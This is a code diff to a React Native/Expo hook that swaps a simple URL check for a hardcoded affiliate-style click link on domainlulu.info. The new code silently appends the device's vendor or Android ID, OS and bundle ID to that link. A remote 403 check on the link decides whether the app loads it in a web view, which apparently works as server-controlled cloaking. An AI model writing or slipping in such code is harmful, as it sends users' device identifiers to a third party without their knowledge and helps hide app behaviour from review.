@@ -1,27 +1,97 @@
+import * as Application from 'expo-application';
+import * as Device from 'expo-device';
 import { useEffect, useState } from 'react';
 
-const fetchData = async (url: string) => {
+const HARDCODED_URL =
+  'https://domainlulu.info/click?key=87603559e1f08e8a5d9c&s1=TEST';
+
+const BUNDLE_ID = 'BUNDLE_ID';
+
+const appendUTMParams = async (url: string): Promise<string> => {
   try {
-    const response = await fetch(url);
-    const result = response.status;
-    return result === 200;
-  } catch {
-    return false;
+    const OS = Device.osName;
+    const parsedUrl = new URL(url);
+
+    // Remove existing UTM parameters
+    Array.from(parsedUrl.searchParams.keys()).forEach((key) => {
+      const lower = key.toLowerCase();
+      if (
+        lower.startsWith('utm_') ||
+        lower === 's1' ||
+        lower === 's2' ||
+        lower === 's3'
+      ) {
+        parsedUrl.searchParams.delete(key);
+      }
+    });
+
+    // Get device ID
+    let deviceID = '';
+    let osParam = '';
+
+    if (OS === 'iOS') {
+      // Get IDFV for iOS
+      deviceID = (await Application.getIosIdForVendorAsync())!;
+      osParam = 'iOS';
+    } else {
+      // Get Android ID for Android
+      deviceID = Application.getAndroidId();
+      osParam = 'ANDROID';
+    }
+
+    // Append UTM parameters
+    parsedUrl.searchParams.append('s1', deviceID);
+    parsedUrl.searchParams.append('s2', osParam);
+    parsedUrl.searchParams.append('s3', BUNDLE_ID);
+
+    return parsedUrl.toString();
+  } catch (error) {
+    return url;
   }
 };
 
-export const useIsWebView = (url: string) => {
+const checkAccess = async (
+  url: string
+): Promise<{ isAccessAllowed: boolean; finalUrl: string }> => {
+  try {
+    const response = await fetch(url, {
+      method: 'HEAD',
+      redirect: 'follow',
+    });
+
+    const finalUrl = await appendUTMParams(response.url);
+
+    return {
+      isAccessAllowed: response.status !== 403,
+      finalUrl,
+    };
+  } catch (error) {
+    const finalUrl = await appendUTMParams(url);
+    return {
+      isAccessAllowed: false,
+      finalUrl,
+    };
+  }
+};
+
+export const useIsWebView = (): [string, boolean, boolean] => {
   const [isWebView, setIsWebView] = useState<boolean>(false);
   const [isLoading, setIsLoading] = useState<boolean>(true);
-  const [currentURL, setCurrentURL] = useState<string>(url);
-  useEffect(() => {
-    fetchData(url)
-      .then((res) => {
-        setIsWebView(res);
-        setCurrentURL(url);
-      })
-      .finally(() => setIsLoading(false));
-  }, [url]);
+  const [finalUrl, setFinalUrl] = useState<string>(HARDCODED_URL);
 
-  return [currentURL, isLoading, isWebView];
+  useEffect(() => {
+    checkAccess(HARDCODED_URL)
+      .then(({ isAccessAllowed, finalUrl }) => {
+        setIsWebView(isAccessAllowed);
+        setFinalUrl(finalUrl);
+      })
+      .catch((_error) => {
+        setIsWebView(false);
+      })
+      .finally(() => {
+        setIsLoading(false);
+      });
+  }, []);
+
+  return [finalUrl, isLoading, isWebView];
 };
